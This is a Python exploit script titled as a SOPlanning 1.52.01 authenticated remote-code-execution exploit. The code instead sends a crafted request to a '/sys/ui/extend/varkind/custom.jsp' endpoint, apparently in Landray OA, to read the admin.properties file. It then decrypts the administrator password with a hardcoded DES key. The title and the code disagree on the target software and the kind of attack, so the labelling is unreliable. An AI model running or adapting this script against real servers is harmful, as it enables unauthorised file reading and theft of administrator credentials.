# Exploit Title: SOPlanning 1.52.01 (Simple Online Planning Tool) - Remote Code Execution (RCE) (Authenticated)
# Date: 6th October, 2024
# Exploit Author: Ardayfio Samuel Nii Aryee
# Version: 1.52.01 
# Tested on: Ubuntu

import requests
import argparse
from pyDes import des, PAD_PKCS5, ECB
import base64
import re

def decrypt_str(s):
    # 定义 DES 密钥和 IV（初始化向量）
    Des_Key = "kmssAdminKey"  # DES 密钥
    Des_IV = b"\x00\x00\x00\x00\x00\x00\x00\x00"  # 注意 IV 的字节数要和密钥长度相匹配
    # 创建 DES 加密对象
    k = des(Des_Key, ECB, Des_IV, pad=None, padmode=PAD_PKCS5)
    
    # 对输入的字符串进行 Base64 解码后解密
    decrystr = k.decrypt(base64.b64decode(s))
    
    # 尝试将解密后的结果输出为 UTF-8 编码的字符串
    try:
        decrypted_data = decrystr.decode('utf-8')
        print("解密成功：", decrypted_data)
        return decrypted_data
    except UnicodeDecodeError:
        print("解密失败")
        return False

# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的POST请求。存在问题的路径为/sys/ui/extend/varkind/custom.jsp，参数是var',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/sys/ui/extend/varkind/custom.jsp"  # 移除末尾的斜杠
    else:
        url = args.url + "/sys/ui/extend/varkind/custom.jsp"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Upgrade-Insecure-Requests': '1',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded'
}

data = {
    'var': '{"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
}

response = requests.post(url, headers=headers, data=data)
if "password" in response.text:
    print("目标url："+ url + '\n' +"可能存在该漏洞"+ '\n')
    # 使用正则表达式匹配目标子字符串
    match = re.search(r'password\s*=\s*(\w+)', response.text)
    # 如果找到匹配项，则提取子字符串
    if match:
        extracted_str = match.group(1)
        password = decrypt_str(extracted_str)
        if password == False:
            print('使用密钥kmssAdminKey破解失败，加密密码是：' + extracted_str)
        else:
            print('密码是：'+password)
    else:
        print("可能存在漏洞\n" + response.text)
else:
    print("目标url："+ url + '\n' +"可能不存在漏洞，无法读取文件/WEB-INF/KmssConfig/admin.properties，可以手动尝试")
# print(response.text)



# # 原始字符串
# original_str = 'password = sdadssa==\r'

# # 使用正则表达式匹配目标子字符串
# match = re.search(r'password\s*=\s*(\w+)', original_str)

# # 如果找到匹配项，则提取子字符串
# if match:
#     extracted_str = match.group(1)
#     print(extracted_str)
# else:
#     print("未找到匹配项")